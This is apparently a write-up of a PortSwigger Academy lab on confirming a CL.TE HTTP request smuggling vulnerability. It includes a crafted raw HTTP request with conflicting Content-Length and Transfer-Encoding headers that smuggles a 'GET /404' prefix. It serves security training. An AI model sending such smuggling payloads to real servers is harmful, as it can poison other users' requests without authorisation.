# HTTP - request smuggling, confirming a CL.TE vulnerability via differential responses  

## 📌 Lab Details
- **Title**: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
- **Difficulty**: Practitioner
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/15f066df40dd7d208e9874af7dba51ac602d94871f25ccd02692a793ebffe91f?referrer=%2fweb-security%2frequest-smuggling%2ffinding%2flab-confirming-cl-te-via-differential-responses

## 🔍 Summary
This lab demonstrates a **CL.TE HTTP request smuggling** vulnerability where the front-end uses `Content-Length` and the back-end uses `Transfer-Encoding: chunked`. By crafting a request where the back-end sees part of the body as a new HTTP request (`GET /404`), you cause the next request to return a **404 Not Found**, confirming the vulnerability.

## 🛠 Steps to Solve
1. Intercept the request and send it to **Burp Repeater**.
2. Now, issue the following request twice:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 35
   Transfer-Encoding: chunked

   0

   GET /404 HTTP/1.1
   X-Ignore: X
   ```
3. The second request should receive an HTTP 404 response.

## 📖 Key Takeaways
- **CL.TE** → Front-end trusts `Content-Length`, back-end trusts `Transfer-Encoding`.
- Request smuggling can affect the **next user’s request**.
- A distinct response (404) can confirm the smuggle worked.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f125b048-3abc-4477-a3ed-18cc77b0eb7c" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2475f4fe-fe1b-4e44-b009-6fb441d4a7e6" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/bacdac98-7432-4dde-80e0-3fb2e252066d" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/bbbaeb77-9f0f-4bef-be1b-d198eef8d416" />
